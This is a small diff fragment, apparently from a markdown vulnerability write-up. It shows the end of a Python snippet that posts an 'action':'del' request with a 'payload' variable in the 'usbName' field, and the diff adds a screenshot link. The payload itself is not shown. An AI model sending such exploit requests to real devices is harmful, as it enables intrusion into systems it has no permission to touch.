@@ -26,4 +26,4 @@ data = {"action":"del","usbName": payload}
 response = requests.post(url, data=data)
 print(response.text)
 ```
-
+![image-20240316180711436](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316180711436.png)
